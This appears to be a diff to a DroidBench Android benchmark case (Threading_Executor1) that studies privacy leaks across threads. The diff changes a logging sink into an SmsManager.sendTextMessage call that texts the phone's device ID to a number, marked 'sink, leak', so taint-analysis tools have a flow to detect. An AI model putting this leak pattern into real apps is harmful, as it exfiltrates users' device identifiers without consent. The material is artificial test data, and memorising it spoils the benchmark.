@@ -1,13 +1,13 @@
 package de.ecspride;
 
-import java.util.concurrent.Executors;
-
-import android.os.Bundle;
 import android.app.Activity;
 import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.Menu;
+
+import java.util.concurrent.Executors;
 
 /**
  * @testcase_name Threading_Executor1
@@ -43,7 +43,9 @@ public class MainActivity extends Activity {
 
 		@Override
 		public void run() {
-			Log.d("DroidBench", deviceId);
+
+			SmsManager sms = SmsManager.getDefault();
+			sms.sendTextMessage("+49", null,deviceId , null, null);  //sink, leak
 		}
 		
 	}
